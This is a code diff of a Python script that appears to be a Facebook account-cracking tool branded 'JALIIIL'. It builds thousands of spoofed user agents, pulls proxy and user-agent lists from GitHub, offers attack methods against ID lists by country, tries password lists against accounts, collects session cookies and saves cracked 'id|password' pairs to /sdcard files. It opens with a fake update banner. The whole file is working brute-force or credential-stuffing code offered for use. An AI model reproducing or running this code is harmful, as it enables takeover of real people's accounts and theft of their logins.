@@ -1,5 +1,5 @@
 from os import path
-import os,base64,zlib,pip,urllib,time,random
+import os,base64,zlib,pip,urllib,time
 print('[\033[1;32m✓\033[1;37m] Checking For Update !! ')
 time.sleep(1.5)
 print('[\033[1;32m✓\033[1;37m] Wait For Update Tool !! ')
@@ -9,7 +9,7 @@ os.system('clear')
 print('[\033[1;32m✓\033[1;37m] Update Done \033[1;32m✓\033[1;37m Now You Can Use This Tool :) ')
 time.sleep(2)
 try:
-        import os,requests,json,time,re,random,sys,uuid,string,subprocess,tred
+        import os,requests,json,time,re,random,sys,uuid,string,subprocess
         from string import *
         from concurrent.futures import ThreadPoolExecutor as tred
 except ModuleNotFoundError:
@@ -90,27 +90,34 @@ for agent in range(10000):
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)      
 try:
-    prox= requests.get('https://raw.githubusercontent.com/jalilhm/jalil/main/proxies.txt').text
+    prox= requests.get('https://github.com/jalilha/jalil/blob/main/proxies..txt').text
     open('proxies.txt','w').write(proxies)
 except Exception as e:
-    print('\033[1;35m[√] WELCOME TO JALIIIL TOOL')
+    print('\x1b[1;92m[√] WELCOME...')
 	
 proxies=open('proxies.txt','r').read().splitlines()
 
 
 android_models=[]
 try:
-    xx= requests.get('https://raw.githubusercontent.com/jalilhm/jalil/main/strings.txt').text.splitlines()
+    xx = requests.get('https://github.com/jalilha/jalil/blob/main/strings.txt').text.splitlines()
     for line in xx:
         android_models.append(line)
 except:pass
 
 usr=[]
-try:
-    xd= requests.get('https://raw.githubusercontent.com/jalilhm/jalil/main/ua.txt').text.splitlines()
-    for us in xd:
-        usr.append(us)
-except: pass
+def uaku():
+	try:
+		ua=open('ua.txt','r').read().splitlines()
+		for ub in ua:
+			ugen.append(ub)
+	except:
+		a=requests.get('https://raw.githubusercontent.com/jalilha/jalil/main/ua.txt').text
+		ua=open('.ua.txt','w')
+		aa=re.findall('line">(.*?)<',str(a))
+		for un in aa:
+			ua.write(un+'\n') 
+		ua=open('.ua.txt','r').read().splitlines()
        
 logo=(f"""\x1b[38;5;208m
    oooo       .o.       ooooo        ooooo ooooo        
@@ -120,7 +127,8 @@ logo=(f"""\x1b[38;5;208m
     888   .88ooo8888.    888          888   888         
     888  .8'     `888.   888       o  888   888       o 
 .o. 88P o88o     o8888o o888ooooood8 o888o o888ooooood8 
-`Y888P                                                                                                         
+`Y888P  
+                                                                                                                    
 \033[1;33m=========================================================
  \033[1;91mFACEBOOK  : \033[1;36mH. M. JALIL\033[1;37m
  \033[1;91mTELEGRAM  : \033[1;36mITZJALIL0\033[1;37m
@@ -159,7 +167,7 @@ def Fof():
 		except FileNotFoundError:
 			print(f' [\033[1;32mX\033[1;37m] File location Not Found ')
 			exit()
-		print(f' [\033[1;31m1\033[1;37m] Method \033[1;32m1\033[1;37m [\033[1;32mMIX IDS\033[1;37m] \n [\033[1;31m2\033[1;37m] Method \033[1;32m2\033[1;37m [\033[1;32mNEW IDS\033[1;37m] \n [\033[1;31m3\033[1;37m] Method \033[1;32m3\033[1;37m [\033[1;32mOLD IDS\033[1;37m] \n [\033[1;31m4\033[1;37m] Method \033[1;32m4\033[1;37m [\033[1;32mACTIVE IDS\033[1;37m]  ')
+		print(f' [\033[1;31m1\033[1;37m] Method \033[1;32m1\033[1;37m [\033[1;32mMix Ids\033[1;37m] \n [\033[1;31m2\033[1;37m] Method \033[1;32m2\033[1;37m [\033[1;32mMexico Ids\033[1;37m] \n [\033[1;31m3\033[1;37m] Method \033[1;32m3\033[1;37m [\033[1;32mIndia Ids\033[1;37m] \n [\033[1;31m4\033[1;37m] Method \033[1;32m4\033[1;37m [\033[1;32mBd Ids\033[1;37m]  ')
 		mthd=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
 		plist=[]
 		try:
@@ -227,8 +235,8 @@ def m1(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/JALIIIL•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
@@ -270,8 +278,8 @@ def m3(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/JALIIIL•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
@@ -313,8 +321,8 @@ def m2(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/JALIIIL•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
@@ -356,8 +364,8 @@ def m4(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
-                                cek_apk(session,coki)
-                                print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                 open(f'/sdcard/JALIIIL•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
